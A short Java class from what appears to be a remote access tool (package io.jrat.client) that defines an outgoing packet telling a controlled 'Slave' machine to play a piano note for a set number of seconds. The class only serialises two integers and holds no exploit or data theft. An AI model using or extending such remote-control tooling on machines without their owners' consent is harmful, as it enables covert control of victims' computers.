package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet67LongPianoNote extends AbstractOutgoingPacket {

	private int note;
	private int seconds;

	public Packet67LongPianoNote(int note, int seconds) {
		this.note = note;
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(note);
		dos.writeInt(seconds);
	}

	@Override
	public byte getPacketId() {
		return 67;
	}

}
